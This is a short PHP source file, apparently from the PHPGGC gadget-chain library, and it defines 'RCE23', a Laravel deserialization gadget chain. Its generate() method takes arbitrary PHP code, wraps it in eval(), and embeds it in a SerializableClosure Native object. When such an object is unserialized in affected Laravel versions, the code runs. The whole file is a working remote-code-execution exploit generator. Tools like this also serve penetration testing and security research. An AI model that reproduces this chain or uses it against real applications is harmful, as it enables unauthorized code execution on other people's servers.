<?php

namespace GadgetChain\Laravel;

class RCE23 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = 'v8.62.0 <= ?';
    public static $vector = '__unserialize';
    public static $author = 'maple3142';

    public function generate(array $parameters)
    {
        // the code is executed in the expression of a return statement
        // so eval is needed to handle the case of multiple statements
        $code = $parameters['code'] . "exit;";
        $escaped_code = "'" . addcslashes($code, "\\'") . "'";
        $expr = "eval($escaped_code)";
        return new \Laravel\SerializableClosure\Serializers\Native($expr);
    }
}
